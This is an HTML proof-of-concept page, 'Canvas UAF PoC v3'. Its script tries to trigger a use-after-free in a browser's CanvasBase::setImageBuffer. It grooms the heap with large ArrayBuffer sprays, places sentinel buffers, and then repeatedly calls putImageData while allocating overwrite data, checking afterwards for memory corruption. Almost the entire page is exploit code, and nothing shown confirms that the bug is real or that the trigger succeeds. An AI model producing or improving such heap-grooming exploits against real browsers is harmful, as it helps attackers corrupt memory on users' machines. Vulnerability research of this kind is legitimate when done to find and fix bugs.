<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Canvas UAF PoC v3</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>Canvas UAF PoC v3</h1>
    <p>Click to trigger UAF in CanvasBase::setImageBuffer.</p>
    <button id="trigger">Trigger UAF</button>
    <canvas id="canvas" width="100" height="100"></canvas>
    <script>
        function setupMemoryCheck() {
            const buffers = [];
            for (let i = 0; i < 100; i++) {
                const buf = new ArrayBuffer(2048); // 2KB
                const view = new Uint8Array(buf);
                view.fill(0x46); // Fill with 0x46
                buffers.push(view);
            }
            return () => {
                let changes = [];
                for (let b = 0; b < buffers.length; b++) {
                    for (let i = 0; i < buffers[b].length; i++) {
                        if (buffers[b][i] !== 0x46) {
                            changes.push(`Buffer[${b}][0x${i.toString(16)}]: 0x${buffers[b][i].toString(16)}`);
                        }
                    }
                }
                return changes.length ? changes.join(', ') : 'No changes';
            };
        }

        document.getElementById('trigger').addEventListener('click', () => {
            alert('Initiating PoC...');
            try {
                // Heap grooming
                alert('Grooming heap with 100x128KB buffers...');
                const groom = [];
                for (let i = 0; i < 100; i++) {
                    const buf = new ArrayBuffer(128 * 1024); // 128KB
                    const view = new Uint8Array(buf);
                    view.fill(0x41);
                    groom.push(view);
                }

                // Initialize memory checker
                const check = setupMemoryCheck();
                alert('Memory checker initialized (100x2KB buffers with 0x46).');

                // Create canvas and context
                alert('Creating canvas and context...');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');

                // Create ImageData
                alert('Creating ImageData...');
                const imageData = ctx.createImageData(100, 100);
                const data = imageData.data;
                data.fill(0xFF); // Fill with known value

                setTimeout(() => {
                    try {
                        // Check memory before manipulation
                        const before = check();
                        alert(`Memory before manipulation: ${before}`);

                        // Attempt to trigger UAF
                        alert('Attempting to trigger UAF with putImageData...');
                        for (let i = 0; i < 100; i++) {
                            ctx.putImageData(imageData, 0, 0); // Repeated calls
                            const tempData = ctx.createImageData(50, 50); // Allocate more
                            tempData.data.fill(0x48); // Try to overwrite
                        }

                        // Check memory after
                        const after = check();
                        alert(`Memory after manipulation: ${after}`);
                    } catch (err) {
                        alert(`Error: ${err.message}`);
                    }
                }, 600);
            } catch (err) {
                alert(`Initial error: ${err.message}`);
            }
        });
    </script>
</body>
</html>
